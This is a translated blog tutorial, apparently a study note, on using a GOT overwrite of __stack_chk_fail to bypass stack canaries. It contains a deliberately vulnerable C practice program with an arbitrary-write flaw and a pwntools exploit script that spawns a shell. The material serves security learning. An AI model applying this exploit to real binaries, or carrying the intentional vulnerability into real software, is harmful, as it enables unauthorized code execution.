---
title: "[PWNABLE] Canary_GOT Overwrite"
description: "※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ Previously, I posted about the Canary technique and methods to bypass it, https://whrdud727.tistory.com/10 [PWNABLE] Canary_설명 ※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ SSP(Stack S"
date: "2023-10-22"
translation_key: "tistory-be437eb64d47"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-CanaryGOT-Overwrite"
private: false
---

**※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections.** **※**

**Earlier, I posted about the Canary technique and methods to bypass it,**

**[https://whrdud727.tistory.com/10](https://whrdud727.tistory.com/10)**

 [Canary Explanation on PWNABLE

※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ SSP (Stack Smashing Protector) is a technique used to protect the sfp and ret from stack buffer overflow, verifying using a value called canary on the stack

whrdud727.tistory.com](https://whrdud727.tistory.com/10)

[https://whrdud727.tistory.com/11](https://whrdud727.tistory.com/11)

 [Canary Bypass on PWNABLE

※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ In the previous post, I discussed canary. This time, I will cover the bypass methods. 1. canary leak 2. got overwrite (briefly)

whrdud727.tistory.com](https://whrdud727.tistory.com/11)

While explaining the bypass techniques, I left out the part that requires knowledge of the attack technique called GOT Overwrite.

I will explain that in this post.

The function that checks whether the canary in the binary file has been tampered with is called the '__stack_chk_fail' function.

This function, like other functions, is called using plt and got.

![](/assets/images/tistory/tistory-be437eb64d47/001.png)

You probably have an idea of how to approach this.

Of course, if we overwrite '__stack_chk_fail@got' with the address of another function, we can bypass it.

I will take a simple example and do a practical exercise.

```
#include <stdio.h>
#include <stdlib.h>

void shell(){
    system("/bin/sh");
}

int main(){
    unsigned long long addr = 0;
    char s[8];

    read(0,s,20);
    write(1,"Addr :",6);
    scanf("%lld", &addr);
    write(1,"Value :",7);
    scanf("%lld", (void *)addr);
    printf("Good Bye~ whrd");

    return 0;
}
```

In the first input, enter the got address of the function,

In the second input, enter the address of the function you want to change. It's a simple example.

Although we can easily find the function address using the features of pwntools,

In the early stages of studying pwnable, it's better to do it manually by looking at it, so I will proceed based on that method.

![](/assets/images/tistory/tistory-be437eb64d47/002.png)

Since we only need to see the address of a specific function, I used the print command, but

We can also find the '__stack_chk_fail@plt' address using the info func command.

Looking back at the code, we can see that there is a function called shell() that executes a shell.

Coincidentally, the '__stack_chk_fail' function is executed just before the end of the main function.

![](/assets/images/tistory/tistory-be437eb64d47/003.png)

If we overwrite '__stack_chk_fail@got' with the address of shell(), we can get a shell directly.

![](/assets/images/tistory/tistory-be437eb64d47/004.png)

Now, I have prepared all the necessary items.

Now, I will create a payload for the attack.

```
from pwn import*

p = process('./ex1')

shell= 0x4011d6
stack_fail = 0x403348
#shell = e.sym['shell']
#stack_fail = e.got['__stack_chk_fail']

p.send(b"a"*16)
p.sendlineafter(b":",str(stack_fail))
p.sendlineafter(b":",str(shell+4))

p.interactive()
```

When we run the above payload, we can see that the shell is successfully obtained.

![](/assets/images/tistory/tistory-be437eb64d47/005.png)

GOT Overwrite attack before the got state

![](/assets/images/tistory/tistory-be437eb64d47/006.png)

 GOT Overwrite attack after the got state

![](/assets/images/tistory/tistory-be437eb64d47/007.png)

The value has been successfully overwritten.

Because we have tampered with the canary, the main function calls the '__stack_chk_fail' function when it ends.

At this time, the function contains the address of the shell function we have overwritten, so the shell function is executed, resulting in the shell being obtained.